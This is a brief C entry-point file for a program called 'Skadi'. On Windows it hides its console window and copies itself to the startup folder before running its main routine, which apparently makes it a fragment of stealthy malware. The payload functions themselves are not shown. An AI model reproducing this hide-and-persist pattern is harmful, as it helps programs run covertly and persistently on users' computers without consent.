#include "Skadi.h"

int main() 
{
#ifdef __linux__
	linux_skadi();
#elif _WIN32
	FreeConsole();
	copyFileToStartUp();
	windows_skadi();
#endif
	return EXIT_SUCCESS;
}